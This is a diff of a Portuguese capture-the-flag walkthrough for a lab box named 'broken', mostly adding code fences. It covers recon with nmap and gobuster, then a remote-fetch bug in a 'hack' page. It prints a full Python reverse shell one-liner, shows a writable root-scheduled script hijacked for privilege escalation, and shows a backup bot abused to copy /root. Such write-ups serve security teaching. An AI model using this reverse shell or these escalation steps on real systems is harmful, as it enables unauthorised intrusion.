@@ -13,7 +13,7 @@ Ending arp-scan 1.9.7: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 3 
 Está rodando no endereço de final 104.
 
 2) Rodo o nmap para verificar as portas e serviços:
-
+```
 root@parrot:~# nmap -p- -sV -sC -T5 -A -oN nmap_broken 192.168.56.104
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-15 14:22 -03
 Nmap scan report for broken (192.168.56.104)
@@ -40,11 +40,12 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds
+```
 
 Duas portas comuns em CTF's, 22 rodando ssh e a 80 um serviço web. De pronto identifico que é uma versão bem recente do OpenSSH, não lembro de ter lido nada a respeito de nenhuma falha relevante de segurança, parto para o serviço web.
 
 3) Com o intuito de identificar as URL's que estão executando sobre o Apache, executo o gobuster:
-
+```
 root@parrot:~# gobuster dir -u http://192.168.56.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_broken
 ===============================================================
 Gobuster v3.0.1
@@ -65,13 +66,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /server-status (Status: 403)
 ===============================================================
 2020/08/15 14:27:49 Finished
-
+```
 Checo o que está respondendo no contexto /cms. Tem um botão, eu clico e... Curioso testo uma possível abertura para Path Traversal ou Command Injection e recebo a primeira flag:
 
 <print>
 
 4) Executo novamente o gobuster a partir de /cms:
-
+```
 root@parrot:~# gobuster dir -u http://192.168.56.104/cms -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_broken_cms
 ===============================================================
 Gobuster v3.0.1
@@ -90,29 +91,29 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/08/15 14:31:34 Finished
 ===============================================================
-
+```
 Checo o novo contexto identifico e me deparo com a seguinte página:
 
 <print>
 
 Uau, será que podemos hackear qualquer servidor passando IP/porta? Vamos testar, executo um listener via netcat, coloco meu endereço IP e a porta que estou executando e clico em 'hack':
-
+```
 root@parrot:~# nc -nlvp 31337
 listening on [any] 31337 ...
 connect to [192.168.56.105] from (UNKNOWN) [192.168.56.104] 50500
 GET /5eeea87977793dc143b995f6a104d62d.sh HTTP/1.0
 Host: 192.168.56.105:31337
 Connection: close
-
+```
 Interessante, ele tentou um GET no meu endereço buscando esse .sh. Bom, o que podemos fazer? Vamos reproduzir o que ele busca, crio um '5eeea87977793dc143b995f6a104d62d.sh' com um shell reverso:
-
+```
 root@parrot:/tmp/broken# cat 5eeea87977793dc143b995f6a104d62d.sh
 #!/bin/bash
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.105",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-Sudo um servidor web via python para ele buscar o .sh e mantenho um listener netcat com a porta que adicionei na linha do shell reverso. Clico novamente em 'hack' e:
-
+```
+Subo um servidor web via python para ele buscar o .sh e mantenho um listener netcat com a porta que adicionei na linha do shell reverso. Clico novamente em 'hack' e:
+```
 root@parrot:~# nc -nlvp 1337
 listening on [any] 1337 ...
 connect to [192.168.56.105] from (UNKNOWN) [192.168.56.104] 59902
@@ -121,7 +122,7 @@ $ whoami
 www-data
 $ pwd
 /var/www/html/cms/cc
-
+```
 Estou dentro! Agora vamos continuar caçando.
 
 5) Vou ao /home e encontro o diretório da alice, lá consigo mais uma flag. Lá também tem uma nota com o seguinte conteúdo:
@@ -139,26 +140,26 @@ Ok senhor root, obrigado pela informação.
 6) Ainda na home da alice tem um diretório chamado 'script', dentro dele um script em python e um .log, interessante.
 
 7) Rodo o linpeas.sh e não vejo nada de interessante na saída, ao executar o pspy64 para checar se existe algo agendado, eis que:
-
+```
 2020/08/15 00:08:01 CMD: UID=0    PID=23585  | /bin/sh -c sudo -u alice python /home/alice/script/log.py
 2020/08/15 00:08:01 CMD: UID=0    PID=23587  | sudo -u alice python /home/alice/script/log.py
-
+```
 Bom, acho que a partir daí vou escalar os meus privilégios.
 
 8) Para a minha surpresa ao voltar ao diretório 'script' tenho permissão de gravação, bom, vou substituir o arquivo log.py pelo MEU log.py :)
 
 9) Faço a substituição com o mesmo script que utilizei como shell reverso (organizado com os imports e as outras linhas ordenadas), configuro novamente um listener via netcat e aguardo o agendamento:
-
+```
 $ whoami
 whoami
 alice
-
+```
 Ótimo, agora sou a alice rsrs.
 
 10) Agora tenho permissão de acesso a um diretório que antes não conseguia abrir, o 'backup'. A, e tem outra flag lá.
 
 11) Em mais uma nota do senhor root ele diz o seguinte:
-
+```
 Alice we have been hacked !
 
 Please put the path of the website backup directory in path.txt, my bot will do the rest
@@ -166,9 +167,9 @@ Please put the path of the website backup directory in path.txt, my bot will do 
 thx
 
 root
-
+```
 Agora te peguei! Adiciono o /root no path.txt e pouco tempo depois tenho o diretório do root no backup, lá dentro tem a última flag:
-
+```
 Congratulation for the root flag !
 
      _________
@@ -182,6 +183,6 @@ Congratulation for the root flag !
   / """"""""""" \                     I love bitcoin                                 /
  / ::::::::::::: \           1Ba6vFEamUenzrXr4scGQ8QLya7t7zYZ1S                  =D-'
 (_________________)
-
+```
 
 Bem divertido, obrigado EuSecuinfo pela box.
